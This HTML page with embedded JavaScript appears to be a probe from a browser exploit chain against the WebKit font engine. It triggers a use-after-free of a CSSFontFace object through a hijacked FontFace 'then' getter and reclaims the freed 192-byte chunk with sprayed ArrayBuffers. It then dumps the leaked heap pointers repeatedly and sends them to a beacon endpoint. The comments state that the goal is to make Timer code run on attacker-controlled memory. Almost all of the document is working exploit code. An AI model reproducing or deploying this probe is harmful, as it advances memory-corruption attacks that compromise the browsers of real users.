<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P704 — full 192B chunk timeline (Timer region)</title>
<script>
'use strict';
/* ============================================================
 * P704 — dump the WHOLE reclaimed CSSFontFace chunk, over time
 *
 * Why: every probe so far only looked at +0x00/+0x58/+0x68. The
 * question for the exploit chain is what the engine puts in the
 * REST of the 192 bytes — especially the Timer region at the tail
 * (~+0x90..+0xBF), because setStatus() calls m_timeoutTimer.stop()
 * AFTER iterateClients() returns. If we own a chunk whose Timer
 * fields are meaningful, stop() runs on attacker memory.
 *
 * Prior notes (pastawithpesto) describe Timer as carrying
 * Ref<Thread> m_thread with a RELEASE_ASSERT in setNextFireTime().
 * Current upstream TimerBase has NO m_thread (it holds Ref<RunLoop>
 * + ScheduledTask), so the notes likely describe the 1400-era
 * layout. The device bytes decide.
 *
 * Method: trigger the reclaim, then poll the SAME buffer 10 times
 * at 40ms intervals, dumping all 24 qwords each time. That gives a
 * write timeline: which offsets are written, when, and whether a
 * later pass adds more (e.g. a Timer/WeakHashSet being installed).
 *
 * This is read-only and non-destructive: it does not forge anything
 * and does not touch the stale object, so it is low risk.
 * ============================================================ */

function raw(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P704-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }
function h16(v){ return ('0000000000000000'+v.toString(16)).slice(-16); }

var BUF=null, VIEW=null, POLL=0;
var NPOLL=10;

function run(){ raw('BOOT','p704-npoll='+NPOLL); try{ setup(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); } }

function setup(){
  raw('A-GO','');
  var styleEl=document.createElement('style');
  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(styleEl);

  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(face); void face.loaded;

  var abList=[], fired=false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(styleEl){styleEl.remove(); styleEl.textContent=''; styleEl=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<48;k++){
        var ab=new ArrayBuffer(192);
        abList.push(ab);
      }
      try{document.fonts.check('1em s0');}catch(e){}
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em f0, s0','AB');

  setTimeout(function(){
    /* pick the buffer with the most non-zero bytes */
    var best=-1,bestNz=0;
    for(var i=0;i<abList.length;i++){
      var u=new Uint8Array(abList[i]),nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz;best=i;}
    }
    raw('B-PICK','idx='+best+'|nz='+bestNz+'|n='+abList.length);
    if(best<0||bestNz===0){ raw('B-MISS','no-nonzero'); return; }
    BUF=abList[best];
    VIEW=new BigUint64Array(BUF);
    /* begin timeline polling */
    setTimeout(poll, 40);
  }, 200);
}

function poll(){
  POLL++;
  var nz=0, parts=[];
  for(var q=0;q<24;q++){
    var v=VIEW[q];
    if(v!==BigInt(0)){ nz++; parts.push('q'+q+'='+h16(v)); }
  }
  raw('T'+POLL,'nz='+nz+'|'+parts.join(','));

  if(POLL<NPOLL){ setTimeout(poll, 40); return; }

  /* final: byte-level map of every non-zero byte index */
  var u8=new Uint8Array(BUF), idx=[];
  for(var b=0;b<192;b++) if(u8[b]!==0) idx.push(b);
  raw('FINAL-BYTES','n='+idx.length+'|idx='+idx.join(','));

  /* classify the tail: is anything Timer-ish (pointer-shaped) at +0x90.. */
  var ptrs=[];
  for(var q2=18;q2<24;q2++){
    var v2=VIEW[q2];
    if(v2>=BigInt('0x1000000000') && v2<BigInt('0x8000000000')){
      ptrs.push('q'+q2+'='+h16(v2));
    }
  }
  raw('TAIL-PTRS','n='+ptrs.length+'|'+ptrs.join(','));

  /* offsets of every 8-byte slot holding a heap pointer */
  var allp=[];
  for(var q3=0;q3<24;q3++){
    var v3=VIEW[q3];
    if(v3>=BigInt('0x1000000000') && v3<BigInt('0x8000000000')){
      allp.push('q'+q3);
    }
  }
  raw('ALL-PTR-SLOTS','n='+allp.length+'|'+allp.join(','));

  raw('DONE','polls='+NPOLL+'|finalNz='+idx.length);
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P704 — 192B chunk timeline</pre></body></html>
